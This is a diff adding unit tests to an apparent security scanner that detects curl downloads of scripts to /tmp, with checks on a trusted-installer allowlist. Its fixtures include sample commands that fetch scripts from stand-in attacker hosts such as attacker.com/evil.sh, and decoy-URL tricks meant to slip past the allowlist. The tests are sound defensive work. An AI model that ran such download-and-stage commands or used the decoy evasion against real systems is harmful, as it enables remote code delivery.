@@ -174,3 +174,157 @@ def test_argv_curl_without_output_flag_is_silent():
     # not written to disk) -- no staged file to be a dropper.
     src = 'import subprocess\nsubprocess.run(["curl", "-fsSL", "https://api.example.com/status"])\n'
     assert "DROPPER_DOWNLOAD_TO_TMP" not in _rules(src)
+
+
+# ---------------------------------------------------------------------------
+# C-224: literal-URL first-party installer allowlist (B-118-style, but a FIXED
+# project-curated list -- not skill-self-declared, so a full skip is safe here,
+# unlike C-223's HOST_INFO_EXFIL_FLOW self-declared-host case).
+# ---------------------------------------------------------------------------
+
+def test_argv_curl_trusted_installer_literal_url_is_silent():
+    # The task's own repro: same trusted host B100 already allowlists for the piped
+    # form, now also silent for the download-then-exec argv form.
+    src = (
+        "import subprocess\n"
+        'subprocess.run(["curl", "--proto", "=https", "--tlsv1.2", "-sSf", '
+        '"https://sh.rustup.rs", "-o", "/tmp/rustup-init.sh"])\n'
+    )
+    assert "DROPPER_DOWNLOAD_TO_TMP" not in _rules(src)
+
+
+def test_argv_curl_trusted_org_scoped_github_raw_path_is_silent():
+    src = (
+        "import subprocess\n"
+        'subprocess.run(["curl", '
+        '"https://raw.githubusercontent.com/nvm-sh/nvm/master/install.sh", '
+        '"-o", "/tmp/nvm.sh"])\n'
+    )
+    assert "DROPPER_DOWNLOAD_TO_TMP" not in _rules(src)
+
+
+def test_argv_curl_untrusted_host_still_warns():
+    src = (
+        "import subprocess\n"
+        'subprocess.run(["curl", "-fsSL", "https://bad.example.com/x.sh", '
+        '"-o", "/tmp/x.sh"])\n'
+    )
+    assert "DROPPER_DOWNLOAD_TO_TMP" in _rules(src)
+
+
+def test_argv_curl_trusted_host_over_plain_http_still_warns():
+    # Same host, but http:// (not https) -- not a canonical installer fetch, MITM-able.
+    src = (
+        "import subprocess\n"
+        'subprocess.run(["curl", "http://sh.rustup.rs", "-o", "/tmp/x.sh"])\n'
+    )
+    assert "DROPPER_DOWNLOAD_TO_TMP" in _rules(src)
+
+
+def test_argv_curl_trusted_host_with_query_string_still_warns():
+    # A query string on an otherwise-trusted host is not the canonical installer URL.
+    src = (
+        "import subprocess\n"
+        'subprocess.run(["curl", "https://sh.rustup.rs/?ref=evil", "-o", "/tmp/x.sh"])\n'
+    )
+    assert "DROPPER_DOWNLOAD_TO_TMP" in _rules(src)
+
+
+def test_argv_curl_wrong_org_path_on_multitenant_host_still_warns():
+    # raw.githubusercontent.com is multi-tenant -- only the specific curated org
+    # prefixes (nvm-sh/Homebrew/creationix) are trusted, not the whole host.
+    src = (
+        "import subprocess\n"
+        'subprocess.run(["curl", '
+        '"https://raw.githubusercontent.com/attacker-org/repo/main/install.sh", '
+        '"-o", "/tmp/x.sh"])\n'
+    )
+    assert "DROPPER_DOWNLOAD_TO_TMP" in _rules(src)
+
+
+def test_argv_curl_variable_url_still_warns_even_near_trusted_literal():
+    # A dynamic URL can't be resolved statically -- must not be silently allowlisted.
+    src = (
+        "import subprocess\n"
+        "_RUNTIME_URL = get_config_url()\n"
+        'subprocess.run(["curl", "-fsSL", _RUNTIME_URL, "-o", "/tmp/_rt.sh"])\n'
+    )
+    assert "DROPPER_DOWNLOAD_TO_TMP" in _rules(src)
+
+
+def test_trusted_installer_list_stays_in_sync_with_content_py():
+    # Cross-reference guard: skillast.py's _CURL_DROPPER_TRUSTED_INSTALLERS is a
+    # deliberate duplication of checks/_content.py's _CLICKFIX_TRUSTED_INSTALLERS
+    # (skillast.py cannot import checks/_content.py -- layering). If one list is
+    # updated without the other, this test goes red instead of silently drifting.
+    from clawseccheck.checks._content import _CLICKFIX_TRUSTED_INSTALLERS
+    from clawseccheck.skillast import _CURL_DROPPER_TRUSTED_INSTALLERS
+    assert set(_CURL_DROPPER_TRUSTED_INSTALLERS) == set(_CLICKFIX_TRUSTED_INSTALLERS)
+
+
+# ---------------------------------------------------------------------------
+# C-135 round 1: a trusted-installer URL cited as a decoy alongside a SECOND,
+# untrusted (URL, -o, path) pair in the same call silenced the whole finding, even
+# though the malicious pair genuinely lands on a writable/script-shaped path.
+# Verified against real curl (multi-URL argv pairs each URL with its own -o).
+# ---------------------------------------------------------------------------
+
+def test_argv_curl_trusted_decoy_with_second_malicious_url_pair_still_warns():
+    src = (
+        "import subprocess\n"
+        'subprocess.run([\n'
+        '    "curl", "https://sh.rustup.rs/installer.sh", "-o", "/tmp/decoy.sh",\n'
+        '    "https://attacker.com/evil.sh", "-o", "/tmp/x.sh",\n'
+        '])\n'
+    )
+    assert "DROPPER_DOWNLOAD_TO_TMP" in _rules(src)
+
+
+def test_argv_curl_malicious_first_trusted_decoy_second_still_warns():
+    src = (
+        "import subprocess\n"
+        'subprocess.run(["curl", "https://attacker.com/evil.sh", "-o", "/tmp/x.sh", '
+        '"https://sh.rustup.rs/installer.sh", "-o", "/tmp/decoy.sh"])\n'
+    )
+    assert "DROPPER_DOWNLOAD_TO_TMP" in _rules(src)
+
+
+def test_argv_curl_single_unambiguous_trusted_url_still_silent():
+    # Positive control: the single-URL case (no ambiguity) must still be silenced --
+    # the multi-URL fix must not over-correct into a blanket regression.
+    src = (
+        "import subprocess\n"
+        'subprocess.run(["curl", "--proto", "=https", "--tlsv1.2", "-sSf", '
+        '"https://sh.rustup.rs", "-o", "/tmp/rustup-init.sh"])\n'
+    )
+    assert "DROPPER_DOWNLOAD_TO_TMP" not in _rules(src)
+
+
+def test_argv_curl_two_trusted_urls_still_warns_ambiguous():
+    # Even two trusted URLs (not just trusted+malicious) must stay WARN -- the URL
+    # producing the flagged -o path is still unprovable from this call shape alone.
+    src = (
+        "import subprocess\n"
+        'subprocess.run(["curl", "https://sh.rustup.rs", "-o", "/tmp/a.sh", '
+        '"https://astral.sh", "-o", "/tmp/x.sh"])\n'
+    )
+    assert "DROPPER_DOWNLOAD_TO_TMP" in _rules(src)
+
+
+def test_argv_curl_malformed_ipv6_url_does_not_crash_and_still_warns():
+    # C-135 round 1: urlparse() raises ValueError on a malformed-IPv6-bracket-shaped
+    # literal instead of failing gracefully -- must not propagate out of
+    # analyze_python(), and must fail closed (stay WARN, not silently trusted).
+    src = (
+        "import subprocess\n"
+        'subprocess.run(["curl", "https://[::1/evil.sh", "-o", "/tmp/x.sh"])\n'
+    )
+    assert "DROPPER_DOWNLOAD_TO_TMP" in _rules(src)
+
+
+def test_content_py_clickfix_trusted_installer_malformed_ipv6_does_not_crash():
+    # Same underlying urlparse() gap existed in the pre-existing sibling
+    # _clickfix_trusted_installer (checks/_content.py) -- fixed alongside C-224
+    # since C-224 duplicated the unguarded pattern.
+    from clawseccheck.checks._content import _clickfix_trusted_installer
+    assert _clickfix_trusted_installer("curl https://[::1/evil.sh | sh") is False
